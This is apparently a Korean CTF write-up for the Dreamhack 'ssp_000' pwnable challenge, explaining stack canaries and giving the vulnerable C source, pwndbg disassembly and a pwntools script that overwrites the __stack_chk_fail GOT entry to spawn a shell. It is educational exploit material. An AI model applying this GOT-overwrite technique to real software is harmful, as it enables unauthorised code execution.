---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN ssp000"
excerpt: "드림핵 포너블 ssp_000 문제풀이"
tags: [Dreamhack, pwnable, ctf, writeup]
math: true
date: 2022-12-21 15:30
---

이번 ssp_000문제는 카나리에 대한 문제다. 메모리 스텍의 오염을 인식하고 오염되었을 경우 바이너리를 강제 종료시키는 기능을 한다. 스텍 사이에 랜덤의 값을 넣고 이를 검사해 스텍이 오버플로우 되었는지 확인한다. 이렇게 메모리 커럽션을 어렵게 하는 기법을 Stack Smashing Protector(SSP)라고 한다.

우선 먼저 코드를 살펴보자.
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell() {
    system("/bin/sh");
}

int main(int argc, char *argv[]) {
    long addr;
    long value;
    char buf[0x40] = {};

    initialize();


    read(0, buf, 0x80);

    printf("Addr : ");
    scanf("%ld", &addr);
    printf("Value : ");
    scanf("%ld", &value);

    *(long *)addr = value;

    return 0;
}
```

함수로 쉘이 함수로 있고 main함수는 간단한 버퍼 오버플로우를 일으킬 수 있다. 다만 실행시킨 바이너리의 카나리 값을 릭할 방법이 마땅치 않는다. 이 경우는 조금 생각을 해볼 필요가 있다. 만약 스텍을 오염시키면 __stack_chk_fail 함수가 실행되면서 종료가 될것이다.

다만 main함수를 보면 원하는 위치에 값을 바꿔쓸수 있는것을 볼수 있다. 이를 이용해 스텍이 오버플로우 되었을때 동작할 함수를 __stack_chk_fail가 아닌 get_shell함수로 바꿔주면 쉘을 얻을 수 있을 것이다.

우선 main함수의 어셈블리를 확인해보자
```c
   0x00000000004008fb <+0>:     push   rbp
   0x00000000004008fc <+1>:     mov    rbp,rsp
   0x00000000004008ff <+4>:     sub    rsp,0x70
   0x0000000000400903 <+8>:     mov    DWORD PTR [rbp-0x64],edi
   0x0000000000400906 <+11>:    mov    QWORD PTR [rbp-0x70],rsi
   0x000000000040090a <+15>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000400913 <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400917 <+28>:    xor    eax,eax
   0x0000000000400919 <+30>:    lea    rdx,[rbp-0x50]
   0x000000000040091d <+34>:    mov    eax,0x0
   0x0000000000400922 <+39>:    mov    ecx,0x8
   0x0000000000400927 <+44>:    mov    rdi,rdx
   0x000000000040092a <+47>:    rep stos QWORD PTR es:[rdi],rax
   0x000000000040092d <+50>:    mov    eax,0x0
   0x0000000000400932 <+55>:    call   0x40088e <initialize>
   0x0000000000400937 <+60>:    lea    rax,[rbp-0x50]
   0x000000000040093b <+64>:    mov    edx,0x80
   0x0000000000400940 <+69>:    mov    rsi,rax
   0x0000000000400943 <+72>:    mov    edi,0x0
   0x0000000000400948 <+77>:    call   0x400710 <read@plt>
   0x000000000040094d <+82>:    mov    edi,0x400a55
   0x0000000000400952 <+87>:    mov    eax,0x0
   0x0000000000400957 <+92>:    call   0x4006f0 <printf@plt>
   0x000000000040095c <+97>:    lea    rax,[rbp-0x60]
   0x0000000000400960 <+101>:   mov    rsi,rax
   0x0000000000400963 <+104>:   mov    edi,0x400a5d
   0x0000000000400968 <+109>:   mov    eax,0x0
   0x000000000040096d <+114>:   call   0x400750 <__isoc99_scanf@plt>
   0x0000000000400972 <+119>:   mov    edi,0x400a61
   0x0000000000400977 <+124>:   mov    eax,0x0
   0x000000000040097c <+129>:   call   0x4006f0 <printf@plt>
   0x0000000000400981 <+134>:   lea    rax,[rbp-0x58]
   0x0000000000400985 <+138>:   mov    rsi,rax
   0x0000000000400988 <+141>:   mov    edi,0x400a5d
   0x000000000040098d <+146>:   mov    eax,0x0
   0x0000000000400992 <+151>:   call   0x400750 <__isoc99_scanf@plt>
   0x0000000000400997 <+156>:   mov    rax,QWORD PTR [rbp-0x60]
   0x000000000040099b <+160>:   mov    rdx,rax
   0x000000000040099e <+163>:   mov    rax,QWORD PTR [rbp-0x58]
   0x00000000004009a2 <+167>:   mov    QWORD PTR [rdx],rax
   0x00000000004009a5 <+170>:   mov    eax,0x0
   0x00000000004009aa <+175>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000004009ae <+179>:   xor    rcx,QWORD PTR fs:0x28
   0x00000000004009b7 <+188>:   je     0x4009be <main+195>
   0x00000000004009b9 <+190>:   call   0x4006d0 <__stack_chk_fail@plt>
   0x00000000004009be <+195>:   leave  
   0x00000000004009bf <+196>:   ret
```

우리가 해당 바이너리를 익스하기 위해 필요한 것은 두가지다. get_shell 함수의 주소와 __stack_chk_fail 함수의 got 주소이다. 이것들 모두 쉽게 확인할 수 있다. __stack_chk_fail의 got는 해당 함수 plt의 주소를 disass 하면 확인할 수 있다.

```c
pwndbg> disass get_shell
Dump of assembler code for function get_shell:
   0x00000000004008ea <+0>:     push   rbp
   0x00000000004008eb <+1>:     mov    rbp,rsp
   0x00000000004008ee <+4>:     mov    edi,0x400a4d
   0x00000000004008f3 <+9>:     call   0x4006e0 <system@plt>
   0x00000000004008f8 <+14>:    nop
   0x00000000004008f9 <+15>:    pop    rbp
   0x00000000004008fa <+16>:    ret    
End of assembler dump.
```

```c
pwndbg> disass 0x4006d0
Dump of assembler code for function __stack_chk_fail@plt:
   0x00000000004006d0 <+0>:     jmp    QWORD PTR [rip+0x20094a]        # 0x601020 <__stack_chk_fail@got.plt>
   0x00000000004006d6 <+6>:     push   0x1
   0x00000000004006db <+11>:    jmp    0x4006b0
End of assembler dump.
```

get_shell 함수의 주소는 0x4008ea, __stack_chk_fail 함수의 got값은 0x601020로 확인할 수 있다. 이를 바탕으로 __stack_chk_fail함수 주소를 get_shell 함수로 바꾸기 위해 익스플로잇 코드를 작성해봤다. 해당 익스 코드는 다음과 같다.

```python
from pwn import *
context.update(arch='amd64', os='linux')

c = remote("host3.dreamhack.games", 22697);

stackChkFail = 0x601020
getShell = 0x4008ea

paylaod = "\x90"*0x50

c.send(paylaod)
c.sendlineafter(b"Addr : ", str(stackChkFail))
c.sendlineafter(b"Value : ", str(getShell))

c.interactive()
```

간단하게 카나리 부분을 덮어쓰기 하여 __stack_chk_fail를 인위적으로 일으키면 그전에 바꿔치기한 함수인 get_shell이 실행된다.